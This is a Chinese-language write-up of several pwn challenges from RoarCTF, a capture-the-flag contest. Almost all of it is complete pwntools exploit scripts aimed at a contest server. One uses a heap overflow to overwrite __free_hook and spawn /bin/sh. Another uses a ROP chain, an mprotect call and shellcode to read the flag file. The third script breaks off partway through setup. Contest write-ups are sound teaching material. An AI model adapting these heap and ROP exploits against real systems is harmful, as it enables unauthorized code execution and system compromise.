# Roarctf 部分Writeup
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## pwn
###  easypwn
程序有后门规则，直接利用该规则就行利用即可。
    __int64 __fastcall sub_E26(signed int size, unsigned int c_size)
    {
      __int64 result; // rax
      if ( size > (signed int)c_size )
        return c_size;
      if ( c_size - size == 10 )
        LODWORD(result) = size + 1;
      else
        LODWORD(result) = size;
      return (unsigned int)result;
    }
脚本：
    #!/usr/bin/python2
    # -*- coding:utf-8 -*-    
    from pwn import *
    import os
    import struct
    import random
    import time
    import sys
    import signal
    salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
    def clear(signum=None, stack=None):
        print('Strip  all debugging information')
        os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
        exit(0)
    for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
        signal.signal(sig, clear)
    # # Create a symbol file for GDB debugging
    # try:
    #     gdb_symbols = '''
    #     '''
    #     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    #     f.write(gdb_symbols)
    #     f.close()
    #     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    #     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    # except Exception as e:
    #     print(e)
    context.arch = 'amd64'
    # context.arch = 'i386'
    context.log_level = 'debug'
    execve_file = './easypwn'
    # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
    # sh = process(execve_file)
    sh = remote('39.97.182.233', 30099)
    elf = ELF(execve_file)
    # libc = ELF('./libc-2.23.so')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    # Create temporary files for GDB debugging
    try:
        gdbscript = '''
        '''
        f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
        f.write(str(proc.pidof(sh)[0]))
        f.close()
        f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
        f.write(gdbscript)
        f.close()
    except Exception as e:
        pass
    def create(size):
        sh.sendlineafter(': ', '1')
        sh.sendlineafter(': ', str(size))
    def edit(index, size, content):
        sh.sendlineafter(': ', '2')
        sh.sendlineafter(': ', str(index))
        sh.sendlineafter(': ', str(size))
        sh.sendafter(': ', content)
    def drop(index):
        sh.sendlineafter(': ', '3')
        sh.sendlineafter(': ', str(index))
    def show(index):
        sh.sendlineafter(': ', '4')
        sh.sendlineafter(': ', str(index))
    create(0x18)
    create(0x18)
    create(0x68)
    create(0x18)
    edit(0, 0x18 + 10, 'a' * 0x18 + p8(0x91))
    drop(1)
    create(0x18) # 1
    show(2)
    sh.recvuntil('content: ')
    result = sh.recvn(8)
    libc_addr = u64(result) - 0x3c4b78
    log.success('libc_addr: ' + hex(libc_addr))
    edit(2, 0x10, p64(0) + p64(libc_addr + libc.symbols['__free_hook'] - 0x40))
    create(0x68)
    drop(4)
    edit(2, 8, p64(libc_addr + libc.symbols['__free_hook'] - 0x33))
    create(0x68)
    create(0x68)
    edit(5, 0x23 + 8, '' * 0x23 + p64(libc_addr + libc.symbols['system']))
    edit(0, 8, '/bin/sh')
    drop(0)
    sh.interactive()
    clear()
###  easyrop
明显的栈溢出，通过程序读取文件夹属性的功能来判断靶机环境。然后注意溢出的index即可。程序禁用了execve系统调用，可以直接ROP读取flag或者shellcode读取。
    #!/usr/bin/python2
    # -*- coding:utf-8 -*-    
    from pwn import *
    import os
    import struct
    import random
    import time
    import sys
    import signal
    salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
    def clear(signum=None, stack=None):
        print('Strip  all debugging information')
        os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
        exit(0)
    for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
        signal.signal(sig, clear)
    # # Create a symbol file for GDB debugging
    # try:
    #     gdb_symbols = '''
    #     '''
    #     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    #     f.write(gdb_symbols)
    #     f.close()
    #     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    #     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    # except Exception as e:
    #     print(e)
    context.arch = 'amd64'
    # context.arch = 'i386'
    context.log_level = 'debug'
    execve_file = './easyrop'
    # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
    # sh = process(execve_file)
    sh = remote('39.97.182.233', 32970)
    elf = ELF(execve_file)
    # libc = ELF('./libc-2.27.so')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    # Create temporary files for GDB debugging
    try:
        gdbscript = '''
        b *0x401B2B
        '''
        f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
        f.write(str(proc.pidof(sh)[0]))
        f.close()
        f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
        f.write(gdbscript)
        f.close()
    except Exception as e:
        pass
    pause()
    layout = [
        0x0000000000400640, # : ret
        0x0000000000401b93, # : pop rdi ; ret
        elf.got['puts'],
        elf.plt['puts'],
        0x4019F3, # main
    ]
    sh.sendlineafter('>> ', 'a' * 0x418 + p8(0x28) + flat(layout))
    sh.recvuntil('path.n')
    result = sh.recvuntil('n', drop=True)
    libc_addr = u64(result.ljust(8, '')) - libc.symbols['puts']
    log.success('libc_addr: ' + hex(libc_addr))
    layout = [
        0x0000000000401b93, # : pop rdi ; ret
        elf.bss(),
        libc_addr + libc.symbols['gets'],
        0x0000000000401b93, # : pop rdi ; ret
        elf.bss() & 0xfffffffffffff000,
        libc_addr + 0x0000000000023e6a, #: pop rsi; ret;
        0x1000 ,
        libc_addr + 0x0000000000001b96, #: pop rdx; ret; 
        7 ,
        libc_addr + libc.symbols['mprotect'],
        elf.bss(),
    ]
    sh.sendlineafter('>> ', 'a' * 0x418 + p8(0x28) + flat(layout))
    shellcode = asm('''
    mov rax, 0x67616c662f2e
    push rax
    mov rdi, rsp
    xor esi, esi
    mov eax, 2
    syscall
    cmp eax, 0
    jg next
    push 1
    mov edi, 1
    mov rsi, rsp
    mov edx, 4
    mov eax, edi
    syscall
    jmp exit
    next:
    mov edi, eax
    mov rsi, rsp
    mov edx, 0x100
    xor eax, eax
    syscall
    mov edx, eax
    mov edi, 1
    mov rsi, rsp
    mov eax, edi
    syscall
    exit:
    xor edi, edi
    mov eax, 231
    syscall
    ''')
    sh.sendline(shellcode)
    sh.interactive()
    clear()
###  easyheap
程序并没有开启pie，利用后门函数构造 double free 控制 .bss 段来泄露地址并劫持 hook。
    #!/usr/bin/python2
    # -*- coding:utf-8 -*-    
    from pwn import *
    import os
    import struct
    import random
    import time
    import sys
    import signal
    salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
    def clear(signum=None, stack=None):
        print('Strip  all debugging information')
        os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
        exit(0)
    for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
        signal.signal(sig, clear)
    # # Create a symbol file for GDB debugging
    # try:
    #     gdb_symbols = '''
    #     '''
    #     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    #     f.write(gdb_symbols)
    #     f.close()
    #     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    #     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    # except Exception as e:
    #     print(e)
    context.arch = 'amd64'
    # context.arch = 'i386'
    context.log_level = 'debug'
    execve_file = './easyheap'
    # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
    # sh = process(execve_file)
    sh = remote('39.97.182.233', 41564)
    elf = ELF(execve_file)
    # libc = ELF('./libc-2.27.so')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    # Create temporary files for GDB debugging
    try:
        gdbscript = '''
        b malloc
        '''
        f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
        f.write(str(proc.pidof(sh)[0]))
        f.close()